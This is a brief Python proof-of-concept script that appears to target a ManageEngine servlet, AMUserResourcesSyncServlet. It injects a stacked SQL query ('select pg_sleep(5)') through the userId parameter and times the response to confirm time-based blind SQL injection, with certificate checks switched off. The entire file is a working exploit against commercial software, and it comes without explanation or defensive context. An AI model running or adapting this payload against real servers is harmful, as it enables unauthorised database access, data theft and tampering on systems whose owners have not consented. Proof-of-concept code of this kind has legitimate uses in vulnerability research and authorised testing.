import requests
import time
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def send_request(target, query):
    request_path = f"{target}/servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;{query};"

    t1 = time.time()
    r = requests.get(request_path, verify=False)
    t2 = time.time()

    print(t2 - t1)


send_request('https://manageengine:8443', 'select+pg_sleep(5)')